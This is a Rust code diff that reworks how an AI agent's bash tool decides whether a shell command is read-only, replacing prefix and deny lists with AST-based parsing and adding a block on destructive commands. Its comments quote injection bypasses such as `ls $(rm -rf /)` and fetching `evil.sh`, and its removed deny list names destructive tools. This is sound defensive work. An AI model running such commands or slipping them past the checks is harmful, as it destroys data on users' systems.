@@ -8,65 +8,8 @@ use serde_json::{Value, json};
 
 use super::base::{Tool, ToolContext, ToolError};
 use crate::sandbox::Sandbox;
+use crate::tools::command_safety;
 use zeno_tools::{JsonToolOutput, ToolOutput};
-
-/// Commands that are known to be read-only (no side effects).
-/// Used by `is_read_only` to skip unnecessary permission confirmations
-/// in "ask" mode — e.g. `ls`, `cat`, `git status` don't modify anything.
-const READONLY_PREFIXES: &[&str] = &[
-    "ls ",
-    "cat ",
-    "head ",
-    "tail ",
-    "less ",
-    "more ",
-    "file ",
-    "which ",
-    "where ",
-    "type ",
-    "grep ",
-    "rg ",
-    "ag ",
-    "ack ",
-    "find ",
-    "fd ",
-    "locate ",
-    "git status",
-    "git diff",
-    "git log",
-    "git show",
-    "git branch",
-    "git tag",
-    "git remote",
-    "gh ", // GitHub CLI — read-only subcommands dominate
-    "echo ",
-    "printf ",
-    "pwd",
-    "whoami",
-    "hostname",
-    "uname",
-    "env ",
-    "printenv ",
-    "set ",
-    "cargo check",
-    "cargo test",
-    "cargo clippy",
-    "cargo doc",
-    "pytest ",
-    "ruff check",
-    "mypy ",
-    "test ",
-    "[ ",
-    "[[ ",
-    "wc ",
-    "sort ",
-    "uniq ",
-    "cut ",
-    "tr ",
-    "awk ",
-    "sed -n",
-    "xargs -n",
-];
 
 pub struct BashTool {
     use_rtk: bool,
@@ -247,9 +190,16 @@ impl Tool for BashTool {
     }
 
     /// Dynamically determine if a bash command is read-only based on its content.
-    /// Matches the command string against a list of known read-only prefixes.
+    ///
+    /// Uses tree-sitter AST parsing (primary) to decompose compound commands
+    /// and check each sub-command with argument-level safety policies.
+    /// Falls back to conservative string matching if parsing fails.
+    ///
+    /// When an execution policy is configured, it is consulted as the
+    /// authoritative override — user rules take precedence over defaults.
+    ///
     /// This avoids unnecessary "ask" permission prompts for harmless commands
-    /// like `ls`, `cat`, `git status`, etc.
+    /// like `ls`, `cat`, `git status`, compound chains like `ls | wc -l`, etc.
     fn is_read_only(&self, input: &Value) -> bool {
         let cmd = input.get("command").and_then(|v| v.as_str()).unwrap_or("");
         let trimmed = cmd.trim();
@@ -258,84 +208,22 @@ impl Tool for BashTool {
         if trimmed.is_empty() {
             return false;
         }
-        // Reject commands containing shell injection / dangerous constructs.
-        // This prevents bypasses like `ls $(rm -rf /)` or `cat `wget evil.sh``
-        // where a "read-only" prefix hides a destructive sub-command.
-        for danger in &[
-            "$(", // command substitution
-            "${", // variable expansion (can contain commands in some forms)
-            "`",  // backtick command substitution
-            "|",  // pipe (can chain to destructive commands)
-            "&&", // chain
-            "||", // chain
-            ";",  // sequential separator
-            ">>", // append redirect
-            ">",  // redirect (must check before readonly prefix)
-        ] {
-            if trimmed.contains(danger) {
-                return false;
-            }
-        }
 
-        // Consult the execution policy if available
+        // ── Step 1: Exec policy check (authoritative override) ──────────
+        // User-configured rules take highest priority. If a rule matches,
+        // its action is the final decision regardless of AST analysis.
         if let Some(ref policy) = self.exec_policy {
             if let Some(decision) = policy.evaluate(trimmed) {
                 return decision.action == crate::permissions::execpolicy::PolicyAction::Auto;
             }
-            // If no rule matches, default to true so it gets treated as safe
-            // (evaluate_permission will auto-allow in relaxed mode anyway).
-            return true;
         }
 
-        // Fallback for tests/environments without exec_policy
-        const BUILTIN_DESTRUCTIVE: &[&str] = &[
-            "rm ",
-            "mv ",
-            "cp ",
-            "mkdir ",
-            "touch ",
-            "chmod ",
-            "chown ",
-            "kill ",
-            "pkill ",
-            "killall ",
-            "dd ",
-            "mkfs ",
-            "fdisk ",
-            "mount ",
-            "umount ",
-            "sudo ",
-            "doas ",
-            "su ",
-            "apt ",
-            "yum ",
-            "dnf ",
-            "pacman ",
-            "brew install",
-            "brew uninstall",
-            "pip install",
-            "pip uninstall",
-            "npm install",
-            "npm uninstall",
-            "cargo install",
-            "cargo uninstall",
-            "systemctl ",
-            "service ",
-        ];
-        // Check built-in destructive
-        for destructive in BUILTIN_DESTRUCTIVE.iter().copied() {
-            if trimmed.contains(destructive) {
-                return false;
-            }
-        }
-
-        // Check if the command starts with a known read-only prefix.
-        // We verify the *first token* (before any whitespace) matches a known
-        // prefix, to prevent tricks like embedding dangerous constructs after
-        // a safe prefix on the same line.
-        READONLY_PREFIXES
-            .iter()
-            .any(|prefix| trimmed.starts_with(prefix))
+        // ── Step 2: AST-based analysis (primary) ────────────────────────
+        // Uses tree-sitter to parse the command, decompose compound
+        // expressions (|, &&, ||, ;), and check each sub-command with
+        // argument-level safety rules (e.g. `find -exec` is unsafe).
+        // Falls back to string matching if parsing fails.
+        command_safety::is_read_only_command(trimmed)
     }
 
     async fn execute(
@@ -358,6 +246,15 @@ impl Tool for BashTool {
             .get("timeout")
             .and_then(|t| t.as_u64())
             .unwrap_or(self.timeout_secs);
+
+        // Dangerous command check: prevent execution of known destructive
+        // commands (rm -rf, dd, mkfs.*, etc.) before they reach the sandbox.
+        if command_safety::is_dangerous_command(cmd) {
+            tracing::warn!(command = %cmd, "Blocked potentially destructive command");
+            return Err(ToolError::InvalidArguments(format!(
+                "command detected as potentially destructive and was blocked: {cmd}"
+            )));
+        }
 
         // Try rtk routing first
         if let Some((rtk_cmd_str, cd_override)) = self.maybe_rtk_route(cmd).await {
